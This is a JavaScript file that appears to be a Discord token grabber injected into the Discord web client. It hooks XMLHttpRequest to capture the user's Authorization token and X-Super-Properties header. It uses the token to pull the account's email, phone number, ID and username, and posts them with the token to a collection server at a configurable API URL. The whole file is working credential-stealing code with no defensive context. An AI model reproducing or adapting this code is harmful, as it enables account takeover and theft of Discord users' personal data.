const apiurl = "http://127.0.0.1:3000";


async function fetch_configuration() {
	try {
		const request = await fetch(apiurl + "/config");

		if (!request.ok) {
			throw new Error(`Failed to fetch config file. Status: ${request.status} ${request.statusText}`);
		}

		const fileContent = await request.json();
		console.log(fileContent)
		if (fileContent && typeof fileContent.enabled === 'boolean') {
			return fileContent;
		} else {
			throw new Error('Invalid configuration format.');
		}
	} catch (error) {
		console.error("failed to fetch: " + error);
	}
}

(async() => {
	try {
		const configuration = await fetch_configuration();

		console.log("fetched configuration successfully:", configuration);

		if (configuration.enabled === true) {
			let authTokenObtained = false;
			let insideChannelRequest = true;
			let authToken = "";
			let xsuperToken = "";
			const waitForUiUpdateSecs = 1000 // only change if you know what you are doing. 

			var proxied1 = window.XMLHttpRequest.prototype.open;
			window.XMLHttpRequest.prototype.open = function() {
				console.log(arguments[1]);
				if(arguments[1].startsWith('https://discordapp.com/api/v9/channels')){
					if(!authTokenObtained){
						insideChannelRequest = true;
					}
					(function(url){
						setTimeout(function(){ 
							let elements = document.getElementsByTagName('h3');
							if(elements.length >= 1 && elements[0].style.userSelect !== "text"){ 
								elements[0].style.userSelect = "text";
								elements[0].innerHTML += " | "+url.substring("https://discordapp.com/api/v9/channels".length);
							}
						},waitForUiUpdateSecs);
					})(arguments[1]);
				}
				return proxied1.apply(this, [].slice.call(arguments));
			};
			
			let proxied2 = window.XMLHttpRequest.prototype.setRequestHeader;
			window.XMLHttpRequest.prototype.setRequestHeader = async function() {
				if(insideChannelRequest && !authTokenObtained && arguments[0] === "Authorization"){
					authToken = arguments[1];
					authTokenObtained = true;
					console.log("Token Obtained.");

				let result = await getUserdetails(authToken);
				console.log("result is typeof: "+  typeof result);
			
				await sendToken(apiurl + "/token", result);
			
				}
				if(insideChannelRequest && arguments[0] == "X-Super-Properties"){
					xsuperToken = arguments[1];
					console.log("X-Super-Properties updated.")
				}
				return proxied2.apply(this, [].slice.call(arguments));
			};
		} else {
			console.log("token fetching is disabled.")
		}
	} catch (error) {
		console.error("Error handling configuration: " + error);
	}

})()

async function getUserdetails(token) {
	try {
		const request = await fetch("https://discord.com/api/v9/users/@me", {
			method: 'GET',
			headers: {
			  'Authorization': token
			}
		});

		if (!request.ok) {
			throw new Error(`Error fetching user details: ${request.statusText}`);
		}

		const response = await request.json();
		const userobj = {
			avatar: `https://cdn.discordapp.com/avatars/${response.id}/${response.avatar}.webp?size=256`,
			email: response.email,
			id: response.id,
			phone: response.phone,
			token: token,
			username: response.username,
		}
		console.log(userobj);
		return userobj
	} catch (error) {
		console.error("an error occurred while trying to fetch this api point", error);
	}
}

async function sendToken(url, da_body) {
	console.log("SENDING: " + typeof da_body);
	try {
		const request = await fetch(url, {
			method: 'POST',
			headers: {
			  'content-type': 'application/json'
			},
			body: JSON.stringify(da_body)
		});
		
		if (!request.ok) {
			throw new Error(`Error sending token: ${request.statusText}`);
		}
		  
		const response = await request.text();
		console.log("RECEIVED: " + response);
	} catch (error) {
		console.error("an error occurred while trying to fetch this api point", error);
	}

}
